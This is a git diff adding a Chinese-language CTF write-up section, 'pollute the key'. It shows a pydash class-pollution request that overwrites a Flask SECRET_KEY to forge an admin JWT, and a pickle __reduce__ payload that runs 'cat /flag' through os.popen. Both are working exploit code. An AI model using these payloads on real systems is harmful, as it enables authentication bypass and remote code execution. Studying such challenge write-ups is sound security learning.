@@ -80,3 +80,32 @@ print(gzip.decompress(base64.b64decode(s)).decode())
 ```
 
 ## pollute the key
+考查原型链污染，python的pickle反序列化  
+审计源码，发现/api/user/update相关代码有漏洞利用点：可以用pydash原型链污染这个接口，我们可以污染jwt签名的key,绕过admin  
+```python
+fetch('/api/user/update', {
+  method: 'POST',
+  credentials: 'include',
+  headers: {'Content-Type': 'application/json'},
+  body: JSON.stringify({key: '__class__.__init__.__globals__.SECRET_KEY', value: 'secretkey'})
+}).then(r => r.json()).then(console.log);
+```
+然后把cookie的token拿去伪造  
+<img width="600" alt="image" src="https://github.com/user-attachments/assets/49d6560c-dcc6-4fbb-b1e7-1c3afd92c0ad" />  
+拿到admin  
+<img width="600" alt="image" src="https://github.com/user-attachments/assets/55f71847-6cfb-47bb-8e3d-3fa0e1a2dfd7" />  
+/api/order/buy接口存在pickle反序列化  
+提示pickle+base64提交  
+<img width="1113" height="286" alt="image" src="https://github.com/user-attachments/assets/25ce48af-ad2e-4bde-8a6e-f89b7c0d7be7" />
+写个pickle脚本执行cat /flag并存在x.txt  
+```python
+import base64, pickle
+
+class P:
+    def __reduce__(self):
+        return (eval, ("__import__('os').popen('cat /flag > /app/static/x.txt')",))
+
+print(base64.b64encode(pickle.dumps(P(), protocol=0)).decode())
+```
+去/static/x.txt拿到flag
+<img width="600" alt="image" src="https://github.com/user-attachments/assets/e8921f7d-036d-433e-bb60-971d533f2b4b" />
